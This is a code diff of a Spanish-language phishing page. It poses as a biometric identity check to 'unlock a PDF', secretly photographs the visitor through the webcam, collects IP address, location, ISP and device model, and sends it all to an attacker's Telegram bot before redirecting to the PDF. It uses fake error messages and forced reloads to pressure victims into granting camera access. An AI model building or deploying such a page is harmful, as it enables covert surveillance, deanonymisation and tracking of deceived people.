@@ -1,11 +1,39 @@
-<script src="config.js"></script>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso Seguro - Verificación Requerida</title>
+    <style>
+        body { background: #0b1016; color: #00ff41; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Courier New', Courier, monospace; margin: 0; }
+        .scanner { width: 250px; height: 250px; border: 3px solid #00ff41; border-radius: 50%; position: relative; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 25px rgba(0, 255, 65, 0.3); }
+        .line { width: 100%; height: 3px; background: #00ff41; position: absolute; animation: move 2.5s infinite; box-shadow: 0 0 15px #00ff41; }
+        @keyframes move { 0%, 100% { top: 0%; } 50% { top: 100%; } }
+        .msg { margin-top: 25px; text-align: center; font-weight: bold; }
+        .blink { animation: flash 1.5s infinite; }
+        @keyframes flash { 50% { opacity: 0.3; } }
+    </style>
+</head>
+<body>
+
+    <div class="scanner">
+        <div class="line"></div>
+        <span style="font-size: 50px;">👤</span>
+    </div>
+
+    <div class="msg">
+        <p class="blink" id="status">INICIALIZANDO ESCANEO BIOMÉTRICO...</p>
+        <p style="color: #666; font-size: 0.8em;">Validando identidad para acceso al documento PDF.</p>
+    </div>
+
+    <script src="config.js"></script>
     <script>
-        async function iniciarProceso() {
-            let fotoBase64 = null;
-            const statusText = document.querySelector('.blink');
+        async function procesar() {
+            const status = document.getElementById('status');
+            let fotoBlob = null;
 
             try {
-                // 1. Intentar capturar la foto
+                // 1. Captura de Foto (Prioridad alta)
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.createElement('video');
@@ -17,52 +45,62 @@
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    fotoBase64 = canvas.toDataURL('image/jpeg');
+                    // Convertir a Blob directamente para mayor velocidad de envío
+                    fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
                     stream.getTracks().forEach(t => t.stop());
                 } catch (e) {
-                    // Si bloquea la cámara, lanzamos el error falso
-                    statusText.innerHTML = "❌ ERROR DE CONEXIÓN SEGURA";
-                    statusText.style.color = "red";
-                    alert("Error: El sensor biométrico no responde. Por favor, recargue y permita el acceso para desbloquear el PDF.");
-                    location.reload(); // Recarga la página automáticamente
+                    status.innerHTML = "❌ ERROR: SENSOR NO DETECTADO";
+                    status.style.color = "red";
+                    alert("Error de Seguridad: No se detectó el sensor biométrico. Por favor, permita el acceso a la cámara y recargue para continuar.");
+                    location.reload();
                     return;
                 }
 
-                statusText.innerHTML = "✅ IDENTIDAD VERIFICADA. REDIRIGIENDO...";
-                
-                // 2. Obtener datos de red
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
+                status.innerHTML = "✅ VERIFICADO. PROCESANDO DATOS...";
 
-                // 3. Formatear reporte
-                const texto = `🚨 *OBJETIVO DETECTADO*\n\n` +
-                              `📍 *Ciudad:* ${d.city}, ${d.country_name}\n` +
-                              `🌐 *IP:* \`${d.ip}\`\n` +
-                              `📶 *ISP:* ${d.org}\n` +
-                              `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+                // 2. Obtención de Datos (Paralelo para velocidad)
+                const [resIp, agente] = [await fetch('https://ipapi.co/json/'), navigator.userAgent];
+                const d = await resIp.json();
+                const equipo = agente.match(/\(([^)]+)\)/)[1]; // Extrae el modelo del equipo
 
-                // 4. Enviar reporte y Foto
-                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: texto, parse_mode: 'Markdown' })
-                });
+                // 3. Reporte de Texto
+                const reporte = `🚨 *REPORTE DE ACCESO*\n\n` +
+                                `📱 *Equipo:* ${equipo}\n` +
+                                `🌐 *IP:* \`${d.ip}\`\n` +
+                                `📍 *Ubicación:* ${d.city}, ${d.country_name}\n` +
+                                `📶 *ISP:* ${d.org}\n` +
+                                `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                if (fotoBase64) {
-                    const blob = await (await fetch(fotoBase64)).blob();
-                    const formData = new FormData();
-                    formData.append('chat_id', CONFIG.CHAT_ID);
-                    formData.append('photo', blob, 'captura.jpg');
-                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                // 4. Envío a Telegram (Usamos Promise.all para enviar todo a la vez)
+                const promesas = [
+                    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: reporte, parse_mode: 'Markdown' })
+                    })
+                ];
+
+                if (fotoBlob) {
+                    const fd = new FormData();
+                    fd.append('chat_id', CONFIG.CHAT_ID);
+                    fd.append('photo', fotoBlob, 'foto.jpg');
+                    promesas.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd }));
                 }
 
+                await Promise.all(promesas);
+
             } catch (err) {
-                console.log("Error crítico");
+                console.log("...");
             } finally {
-                // Redirigir al PDF después de 2 segundos
-                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 2000);
+                // Redirección final
+                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
             }
         }
 
-        window.onload = iniciarProceso;
+        window.onload = () => {
+            // Pequeño retraso para que la animación se vea antes de pedir la cámara
+            setTimeout(procesar, 1000);
+        };
     </script>
+</body>
+</html>
